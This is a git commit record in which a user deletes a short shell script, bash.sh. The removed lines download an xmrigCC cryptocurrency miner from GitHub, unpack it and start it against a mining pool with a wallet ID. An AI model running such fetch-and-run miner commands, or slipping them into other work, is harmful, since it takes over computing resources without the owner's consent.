1e63f5e826360986ecc370c2e24a7eb6f0ac6055
matteonerhelst <109295860+matteonerhelst@users.noreply.github.com>
2022-07-14 17:42:43 +0300

    Delete bash.sh

--- bash.sh
+++
@@ -1,3 +0,0 @@
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.2.1/xmrigCC-miner_only-3.2.1-linux-generic-static-amd64.tar.gz
-tar -xzvf xmrigCC-miner_only-3.2.1-linux-generic-static-amd64.tar.gz 
-./xmrigDaemon -o xdagmine.com:3232 -a rx/xdag -u uoQf63WiAMxhN5EMUD3Xa5dgmABsYVkJ --donate-level=1 -p 123
